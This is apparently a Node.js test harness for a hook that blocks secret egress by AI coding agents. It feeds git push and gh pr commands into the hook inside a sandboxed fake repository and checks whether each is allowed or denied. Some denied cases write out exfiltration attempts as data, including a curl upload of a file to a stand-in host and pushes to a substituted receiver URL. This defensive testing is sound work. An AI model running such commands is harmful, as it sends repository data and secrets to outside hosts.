'use strict';

// Every proposed command is Hook input DATA. This finite model never starts Git,
// gh, a shell, helpers, or a network client, and never reads their configuration.
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const crypto = require('node:crypto');
const { spawnSync } = require('node:child_process');
const FILES = ['block-secret-egress.cjs', 'lib/git-guard-common.cjs',
  'lib/git-precommit-readers.cjs', 'lib/executable-identity.cjs'];
const URL = 'https://github.com/theosera/obsidian-ai-pipeline.git';
const q = value => "'" + value.replace(/'/g, "'\\''") + "'";
const digest = bytes => crypto.createHash('sha256').update(bytes).digest('hex');

function observe(result) {
  if (result.error || result.status !== 0 || result.signal || result.stderr !== '') return 'BROKEN';
  if (result.stdout === '') return 'ALLOW';
  let wire;
  try { wire = JSON.parse(result.stdout)?.hookSpecificOutput; } catch { return 'BROKEN'; }
  if (wire?.permissionDecision !== 'deny' || typeof wire.permissionDecisionReason !== 'string') return 'BROKEN';
  return wire.permissionDecisionReason.startsWith('[禁止] ') ? 'FORBIDDEN' :
    wire.permissionDecisionReason.startsWith('[判断不能] ') ? 'UNKNOWN' : 'BROKEN';
}

function run(hooks, options = {}) {
  const root = fs.realpathSync.native(fs.mkdtempSync(path.join(os.tmpdir(), 'cx-1106-4-fixture-')));
  const T = path.join(root, 'T'), U = path.join(root, 'U'), home = path.join(root, 'home');
  const preload = path.join(root, 'model.cjs'), modelFile = path.join(root, 'model.json');
  const statsFile = path.join(root, 'stats.json');
  try {
    for (const dir of [T, U, home, path.join(T, '.git')]) fs.mkdirSync(dir);
    fs.mkdirSync(path.join(T, '.git', 'objects'));
    fs.mkdirSync(path.join(T, '.git', 'refs'));
    fs.writeFileSync(path.join(T, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    fs.writeFileSync(path.join(T, '.git', 'config'), '[core]\n repositoryformatversion = 0\n bare = false\n');
    fs.writeFileSync(preload, `
'use strict';
const fs=require('node:fs'),cp=require('node:child_process'),path=require('node:path');
const model=JSON.parse(fs.readFileSync(${JSON.stringify(modelFile)},'utf8'));
const stats={modeledGetters:0,nativeExecutions:0,unexpectedAttempts:0,settingsAccesses:0};
const save=()=>fs.writeFileSync(${JSON.stringify(statsFile)},JSON.stringify(stats));
const installed=new Set(['/usr/bin/gh','/usr/bin/git']);
const anchors=new Set(['/usr/bin','/bin','/usr/sbin','/sbin','/usr/local/bin','/opt/homebrew/bin']);
const selected=file=>typeof file==='string'&&['gh','git'].includes(path.basename(file))&&anchors.has(path.dirname(file));
const missing=()=>{throw Object.assign(Error('CX-1106-4 absent modeled installation'),{code:'ENOENT'});};
const stat=fs.statSync,access=fs.accessSync,real=fs.realpathSync,native=fs.realpathSync.native,read=fs.readFileSync;
const settings=file=>typeof file==='string'&&path.basename(file)==='settings.json';
fs.statSync=function(file,...args){if(selected(file))return installed.has(file)?{isFile:()=>true,isDirectory:()=>false}:missing();return stat.call(this,file,...args);};
fs.accessSync=function(file,...args){if(selected(file))return installed.has(file)?undefined:missing();return access.call(this,file,...args);};
fs.realpathSync=function(file,...args){if(selected(file))return installed.has(file)?file:missing();return real.call(this,file,...args);};
fs.realpathSync.native=function(file,...args){if(selected(file))return installed.has(file)?file:missing();return native.call(this,file,...args);};
fs.readFileSync=function(file,...args){if(settings(file)){stats.settingsAccesses++;save();throw Error('CX-1106-4 settings access forbidden');}return read.call(this,file,...args);};
function getter(file,args,opts={}){
 if(file!=='/usr/bin/git'||opts.cwd!==${JSON.stringify(T)}||opts.shell===true||!Array.isArray(args))return null;
 if(args[0]!=='--no-pager'||args[1]!=='--no-lazy-fetch')return null;
 const tail=args.slice(2);let status=0,text;
 if(tail.length===1&&tail[0]==='--version')text='git version 2.54.0\\n';
 else if(tail.length===6&&JSON.stringify(tail.slice(0,5))===JSON.stringify(['config','--includes','--show-scope','--null','--get-regexp'])){
   const records=tail[5].startsWith('^(push')?(model.operationRecords||[]):model.records;
   text=records.map(([key,value])=>'local\\0'+key+'\\n'+value+'\\0').join('');status=text?0:1;
 }else if(tail.length===5&&JSON.stringify(tail.slice(0,4))===JSON.stringify(['rev-parse','--symbolic-full-name','--verify','--end-of-options'])){
   text=(model.branchPrefix||'refs/heads/')+tail[4]+'\\n';status=model.branchStatus||0;
 }else if(tail.length===5&&JSON.stringify(tail.slice(0,4))===JSON.stringify(['remote','get-url','--push','--all'])&&Object.hasOwn(model.routes,tail[4])){
   text=model.routes[tail[4]].join('\\n')+'\\n';
 }else return null;
 stats.modeledGetters++;save();return {status,stdout:Buffer.from(text),stderr:Buffer.alloc(0),signal:null};
}
const fail=()=>{stats.unexpectedAttempts++;save();throw Error('CX-1106-4 native child forbidden');};
cp.spawnSync=function(file,args,opts){return getter(file,args,opts)||fail();};
cp.execFileSync=function(file,args,opts){const result=getter(file,args,opts);if(!result||result.status!==0)return fail();return opts?.encoding?result.stdout.toString(opts.encoding):result.stdout;};
for(const name of ['spawn','exec','execSync','execFile','fork'])cp[name]=fail;
save();
`);
    const env = { PATH: '/usr/bin:/bin', HOME: home, XDG_CONFIG_HOME: home,
      TMPDIR: root, LANG: 'C', LC_ALL: 'C', CLAUDE_PROJECT_DIR: T,
      GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: os.devNull, GIT_CONFIG_SYSTEM: os.devNull,
      GIT_TERMINAL_PROMPT: '0' };
    const prefix = 'cd ' + q(T) + ' && ';
    const push = 'git push origin claude/fixture';
    const pr = 'gh pr create --repo o/r --head claude/fixture --title ordinary --body ordinary';
    const ordinary = { records: [['remote.origin.url', URL], ['remote.other.url', URL]], routes: { origin: [URL], other: [URL] } };
    const withURL = url => ({ records: [['remote.origin.url', url]], routes: { origin: [url] } });
    const cases = [
      ['A01', pr, 'ALLOW'],
      ['A02', prefix + pr, 'ALLOW'],
      ['A03', prefix + push, 'ALLOW', null, true],
      ['A04', prefix + 'git push -u origin claude/fixture', 'ALLOW', null, true],
      ['A05', prefix + 'git push --set-upstream origin claude/fixture', 'ALLOW', null, true],
      ['A06', prefix + 'git push origin claude/nested/fixture', 'ALLOW', null, true],
      ['D01', prefix + push, 'DENY', withURL('https://receiver.invalid/DUMMY.git')],
      ['D02', prefix + 'git push origin ordinary', 'DENY'],
      ['D03', prefix + push + ' --force', 'DENY'],
      ['D04', prefix + 'git push --force origin claude/fixture', 'DENY'],
      ['D05', prefix + 'git push -f origin claude/fixture', 'DENY'],
      ['D06', prefix + 'git push origin +claude/fixture', 'DENY'],
      ['D07', prefix + 'git push origin claude/fixture:main', 'DENY'],
      ['D08', prefix + 'git push origin main', 'DENY'],
      ['D09', prefix + 'git push origin claude/fixture --force-with-lease', 'DENY'],
      ['D10', prefix + 'git push other claude/fixture', 'DENY'],
      ['D11', 'cd ' + q(U) + ' && ' + push, 'DENY'],
      ['D12', prefix + 'printf ordinary; ' + push, 'DENY'],
      ['D13', prefix + 'git push origin claude/fixture another', 'DENY'],
      ['D14', prefix + 'git push origin claude/', 'DENY'],
      ['D15', prefix + 'git push origin claude/fixture..other', 'DENY'],
      ['D16', prefix + push, 'DENY', { records: [['remote.origin.url', URL], ['remote.origin.pushurl', 'https://receiver.invalid/DUMMY.git']], routes: { origin: [URL, 'https://receiver.invalid/DUMMY.git'] } }],
      ['D17', prefix + push, 'DENY', { records: [['remote.origin.url', URL], ['credential.helper', 'DUMMY-NONEXECUTED']], routes: { origin: [URL] } }],
      ['D18', 'gh pr create --repo o/r --title ordinary --body ordinary', 'DENY'],
      ['D19', 'gh pr create --repo o/r --head claude/fixture --title ordinary --body-file ordinary.txt', 'DENY'],
      ['D20', prefix + 'gh pr create --repo o/r --head claude/fixture --title ordinary --body-file ordinary.txt', 'DENY'],
      ['D21', 'gh pr create --repo o/r --head claude/fixture --title ordinary', 'DENY'],
      ['D22', pr + ' --fill', 'DENY'],
      ['D23', pr + ' --template ordinary', 'DENY'],
      ['D24', pr + ' --web', 'DENY'],
      ['D25', pr + ' --recover ordinary', 'DENY'],
      ['D26', prefix + push, 'DENY', { ...ordinary, branchPrefix: 'refs/tags/' }],
      ['D27', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([['remote.origin.mirror', 'true']]) }],
      ['D28', prefix + push, 'DENY', { ...ordinary, operationRecords: [['push.default', 'matching']] }],
      ['D29', prefix + push, 'DENY', { ...ordinary, operationRecords: [['submodule.recurse', 'true']] }],
      ['D30', prefix + push, 'DENY', { ...ordinary, branchStatus: 1 }],
      ['D31', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', 'refs/heads/claude/fixture:refs/heads/ordinary'],
      ]) }, false, 'UNKNOWN'],
      ['D32', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', ''],
      ]) }, false, 'UNKNOWN'],
      ['D33', prefix + push, 'DENY', { ...ordinary, records: ordinary.records.concat([
        ['remote.origin.push', 'refs/heads/claude/fixture:refs/heads/claude/fixture'],
        ['remote.origin.push', 'refs/heads/claude/other:refs/heads/claude/other'],
      ]) }, false, 'UNKNOWN'],
      ['C05', 'gh pr merge 1 --body-file ordinary.txt', 'DENY'],
      ['C06', 'curl -q -T ordinary.txt https://receiver.invalid', 'DENY'],
    ];
    const sourceBefore = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    const results = [];
    let nativeExecutions = 0, unexpectedAttempts = 0, settingsAccesses = 0, modeledGetters = 0;
    for (const [id, command, expected, model, added, expectedCategory] of cases) {
      fs.writeFileSync(modelFile, JSON.stringify(model || ordinary));
      const child = spawnSync(process.execPath, ['--require', preload, path.join(hooks, FILES[0])], {
        env, cwd: T, input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, cwd: T }),
        encoding: 'utf8', shell: false, timeout: 15000, maxBuffer: 65536,
      });
      const stats = JSON.parse(fs.readFileSync(statsFile, 'utf8'));
      nativeExecutions += stats.nativeExecutions; unexpectedAttempts += stats.unexpectedAttempts;
      settingsAccesses += stats.settingsAccesses; modeledGetters += stats.modeledGetters;
      const category = observe(child);
      const actual = ['FORBIDDEN', 'UNKNOWN'].includes(category) ? 'DENY' : category;
      results.push({ id, actual, category, expected: options.baseline && added ? 'DENY' : expected,
        ...(expectedCategory ? { expectedCategory } : {}) });
    }
    const sourceAfter = Object.fromEntries(FILES.map(file => [file, digest(fs.readFileSync(path.join(hooks, file)))]));
    return { cases: results.length, failed: results.filter(row => row.actual !== row.expected ||
        row.expectedCategory && row.category !== row.expectedCategory).map(row => row.id),
      broken: results.filter(row => row.actual === 'BROKEN').length, results,
      sourcesUnchanged: JSON.stringify(sourceBefore) === JSON.stringify(sourceAfter),
      nativeExecutions, unexpectedAttempts, settingsAccesses, modeledGetters };
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

module.exports = { FILES, run };
